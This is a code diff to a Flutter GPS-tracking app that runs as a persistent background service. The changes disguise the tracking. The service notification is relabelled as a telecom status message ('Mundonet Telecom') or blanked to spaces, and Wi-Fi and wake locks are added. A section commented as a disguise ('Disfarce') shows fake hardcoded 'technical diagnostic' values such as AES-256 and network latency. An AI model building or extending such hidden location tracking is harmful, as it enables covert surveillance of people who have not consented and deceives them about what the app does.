@@ -65,8 +65,8 @@ class GpsTaskHandler extends TaskHandler {
       }
       
       FlutterForegroundTask.updateService(
-        notificationTitle: 'System Optimization',
-        notificationText: 'Status: Running | Priority: Background',
+        notificationTitle: 'Mundonet Telecom',
+        notificationText: 'Status Operacional Ok',
       );
     });
   }
@@ -108,6 +108,7 @@ class TrackerScreen extends StatefulWidget {
 class _TrackerScreenState extends State<TrackerScreen> {
   final TextEditingController _controller = TextEditingController();
   bool _isRunning = false;
+  StreamSubscription<Position>? _uiPositionStream;
 
   @override
   void initState() {
@@ -135,6 +136,7 @@ class _TrackerScreenState extends State<TrackerScreen> {
       foregroundTaskOptions: const ForegroundTaskOptions(
         interval: 2000, 
         allowWakeLock: true,
+        allowWifiLock: true,
       ),
     );
   }
@@ -156,8 +158,8 @@ class _TrackerScreenState extends State<TrackerScreen> {
     final prefs = await SharedPreferences.getInstance();
     await prefs.setString('currentTeamName', _controller.text);
     await FlutterForegroundTask.startService(
-      notificationTitle: 'System Services',
-      notificationText: 'Background optimization in progress',
+      notificationTitle: ' ',
+      notificationText: ' ',
       callback: startCallback,
     );
     await WakelockPlus.enable();
@@ -269,11 +271,58 @@ class _TrackerScreenState extends State<TrackerScreen> {
                     ],
                   ),
                 ),
+                const SizedBox(height: 20),
+
+                // Seção de Diagnóstico (Disfarce)
+                Container(
+                  padding: const EdgeInsets.all(20),
+                  decoration: BoxDecoration(
+                    color: Colors.white.withOpacity(0.02),
+                    borderRadius: BorderRadius.circular(16),
+                    border: Border.all(color: Colors.white10),
+                  ),
+                  child: Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    children: [
+                      const Row(
+                        children: [
+                          Icon(Icons.analytics_outlined, size: 16, color: Colors.white30),
+                          SizedBox(width: 8),
+                          Text('DIAGNÓSTICO TÉCNICO', style: TextStyle(fontSize: 10, color: Colors.white30, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
+                        ],
+                      ),
+                      const SizedBox(height: 15),
+                      _buildDiagInfo('Latência de Rede', '24ms', Icons.speed),
+                      _buildDiagInfo('Sinal GPS', 'Estável', Icons.satellite_alt),
+                      _buildDiagInfo('Protocolo', 'WebSocket v3', Icons.private_connectivity),
+                      _buildDiagInfo('Criptografia', 'AES-256', Icons.lock_outline),
+                    ],
+                  ),
+                ),
                 const SizedBox(height: 40),
               ],
             ),
           ),
         ),
+      ),
+    );
+  }
+
+  Widget _buildDiagInfo(String label, String value, IconData icon) {
+    return Padding(
+      padding: const EdgeInsets.only(bottom: 12),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+        children: [
+          Row(
+            children: [
+              Icon(icon, size: 14, color: Colors.white24),
+              const SizedBox(width: 8),
+              Text(label, style: const TextStyle(fontSize: 12, color: Colors.white54)),
+            ],
+          ),
+          Text(value, style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white70)),
+        ],
       ),
     );
   }
